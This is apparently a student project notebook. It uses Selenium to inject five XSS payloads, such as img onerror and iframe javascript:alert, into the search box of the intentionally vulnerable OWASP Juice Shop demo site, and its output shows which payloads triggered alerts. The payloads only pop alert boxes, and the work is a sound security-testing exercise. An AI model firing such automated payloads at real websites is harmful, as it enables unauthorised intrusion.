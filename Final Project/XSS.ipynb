{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "import time\n",
    "\n",
    "url = \"https://juice-shop.herokuapp.com\"\n",
    "\n",
    "# XSS payloads\n",
    "xss_payloads = [\n",
    "    '<iframe src=\"javascript:alert(`xss`)\">',\n",
    "    \"';alert('XSS2');//\",\n",
    "    \"<svg onload=alert(1)>\",\n",
    "    \"<body onload=alert('xss')>\",\n",
    "    \"<img src=x onerror=alert('XSS')>\"\n",
    "]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Testing payload: <iframe src=\"javascript:alert(`xss`)\">\n",
      "XSS vulnerability detected with payload: <iframe src=\"javascript:alert(`xss`)\">\n",
      "Testing payload: ';alert('XSS2');//\n",
      "No XSS vulnerability detected with payload: ';alert('XSS2');//\n",
      "Testing payload: <svg onload=alert(1)>\n",
      "No XSS vulnerability detected with payload: <svg onload=alert(1)>\n",
      "Testing payload: <body onload=alert('xss')>\n",
      "No XSS vulnerability detected with payload: <body onload=alert('xss')>\n",
      "Testing payload: <img src=x onerror=alert('XSS')>\n",
      "XSS vulnerability detected with payload: <img src=x onerror=alert('XSS')>\n"
     ]
    }
   ],
   "source": [
    "# Setup Chrome WebDriver\n",
    "options = webdriver.ChromeOptions()\n",
    "options.add_argument(\"--start-maximized\")\n",
    "driver = webdriver.Chrome(options=options)\n",
    "\n",
    "vulnerable_payloads = []\n",
    "\n",
    "def test_xss_payloads(driver, payloads):\n",
    "    for payload in payloads:\n",
    "        try:\n",
    "            print(f\"Testing payload: {payload}\")\n",
    "            # Navigate to the search box\n",
    "            search_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'searchQuery')))\n",
    "            search_box.click()\n",
    "\n",
    "            input_field = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'mat-input-0')))\n",
    "            input_field.clear()\n",
    "            input_field.send_keys(payload)\n",
    "            input_field.send_keys(Keys.ENTER)\n",
    "\n",
    "            time.sleep(1)\n",
    "\n",
    "            try:\n",
    "                # Increase the wait time to make sure alert appears\n",
    "                alert = WebDriverWait(driver, 5).until(EC.alert_is_present())\n",
    "                print(f\"XSS vulnerability detected with payload: {payload}\")\n",
    "                alert.accept()\n",
    "                vulnerable_payloads.append(payload)\n",
    "            except:\n",
    "                print(f\"No XSS vulnerability detected with payload: {payload}\")\n",
    "\n",
    "\n",
    "        except Exception as e:\n",
    "            print(f\"Error occurred while testing payload: {payload}, Error: {e}\")\n",
    "            continue  # Continue with the next payload\n",
    "\n",
    "try:\n",
    "    driver.get(url)\n",
    "    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, \".close-dialog\"))).click()\n",
    "\n",
    "    test_xss_payloads(driver, xss_payloads)\n",
    "\n",
    "finally:\n",
    "    driver.quit()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Vulnerable XSS payloads detected:\n",
      "<iframe src=\"javascript:alert(`xss`)\">\n",
      "<img src=x onerror=alert('XSS')>\n"
     ]
    }
   ],
   "source": [
    "if vulnerable_payloads:\n",
    "    print(\"Vulnerable XSS payloads detected:\")\n",
    "    for payload in vulnerable_payloads:\n",
    "        print(payload)\n",
    "else:\n",
    "    print(\"No vulnerable XSS payloads detected.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
